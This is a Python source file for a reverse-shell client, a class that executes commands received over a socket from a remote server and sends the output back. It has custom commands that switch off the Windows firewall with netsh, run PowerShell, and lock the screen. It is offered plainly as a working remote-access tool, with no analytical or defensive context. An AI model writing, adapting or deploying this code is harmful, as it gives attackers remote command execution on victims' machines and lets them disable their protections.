import os
import socket
import subprocess
import ctypes


class Shell:
    """
    Gets a simple reverse shell back to host
    """

    def __init__(self, sock: socket) -> None:
        """
        Constructor

        :param sock: The socket to send the data through
        """
        self.sock = sock

    def get_shell(self) -> None:
        """
        Executes received commands from the server and sends the output back through the socket
        """

        welcome_msg = "\nReverse shell connection successful! \n Type '!help' for list of custom commands, \
        and 'exit' or 'quit' to return \
        Custom commands start with '!'\n"

        self.sock.send(str.encode(welcome_msg))

        while 1:  # Infinite loop
            try:
                # Gets cwd and sends to server
                self.sock.send(str.encode(os.getcwd() + "# "))

                # Receives messages from server
                data = self.sock.recv(1024).decode("UTF-8")
                data = data.strip('\n')

                # opens help menu
                if data == "!help":
                    help_msg = "Custom commands are: \
                        \n !PS [command]: Execute command with powershell \
                        \n !firewall on/off: Turns on/off firewall \
                        \n !lock: Locks screen of client \
                        \n !help: Opens this menu\n"

                    self.sock.send(str.encode(help_msg))

                # Exits shell
                if data == "quit" or data == "exit":
                    break

                # Changes directory
                if data[:2] == "cd":
                    os.chdir(data[3:])

                # Lists cwd with ls
                if data == "ls":
                    data = "dir"

                # Disables/enables firewall
                if data == "!firewall off":
                    data = "netsh advfirewall set currentprofile state off"
                if data == "!firewall on":
                    data = "netsh advfirewall set currentprofile state on"

                # Locks the screen of client
                if data == "!lock":
                    ctypes.windll.user32.LockWorkStation()
                    data = "echo Screen locked"

                # Executes command with powershell
                if data[:2] == "!PS":
                    data = "PowerShell.exe -command {}".format(data[3:])

                if len(data) > 0 and not data == "!help":
                    # Executes arbitrary command
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    output_str = str(stdout_value, "UTF-8")

                    # Sends output back to server
                    self.sock.send(str.encode("\n" + output_str))

            except socket.error:
                break
